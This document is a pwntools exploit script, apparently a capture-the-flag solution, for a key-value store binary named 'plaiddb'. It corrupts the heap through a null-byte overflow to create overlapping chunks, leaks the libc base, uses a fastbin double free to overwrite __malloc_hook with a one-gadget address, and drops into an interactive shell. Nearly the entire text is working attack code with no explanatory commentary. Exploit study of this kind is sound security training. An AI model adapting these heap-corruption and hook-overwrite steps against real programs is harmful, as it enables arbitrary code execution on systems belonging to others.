from pwn import *
def cmd(c):
	p.sendlineafter("and:\n",c)
def show(key):
	cmd("GET")
	p.sendlineafter("key:\n",key)
def show_all():
	cmd("DUMP")
def add(key,size,c="A"):
	cmd("PUT")
	p.sendlineafter("key:\n",key)
	p.sendlineafter("size:\n",str(size))
	if size!=0:
		p.sendafter("data:\n",c.ljust(size,'\x00'))
def free(key):
	cmd("DEL")
	p.sendlineafter("key:\n",key)
context.log_level='debug'
context.arch='amd64'
#libc=ELF('./bc.so.6')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process('./plaiddb')
add("0",0x18)
add("1",0x18)
add("2",0x18)
free("0")
free("1")
add("0",0x38)
add("1",0x400)

add("3",0x88)
add("4",0x38)

free("1")
add("1",0x88)

free("4")
add("4",0x18)
add("n\x0032"*6,0x88,p64(0xdeadbeef))#shrink

free("2")
add("2",0x88)
free("n")
free("3")
# GET IT!
add("9",0x1b8,"OVERLAP")
add("LEAK",0x138,)
show("9")
p.readuntil("s]:\n")
base=u64(p.read(8))-(0x7ffff7dd1b78-0x7ffff7a0d000)
log.warning(hex(base))
free("0")
add("0",0x68,"DOUBLEFREE")
add("3",0x68,"MID")
free("0")
free("3")
free("9")
libc.address=base
add("0",0x68,p64(libc.sym['__malloc_hook']-35))
add("3",0x68)
add("6",0x68)
add("9",0x68,"\x00"*11+p64(0xf02a4+base)+p64(12+libc.sym['realloc'])
)
gdb.attach(p,"b malloc")
cmd("PUT")
p.interactive('n132>')
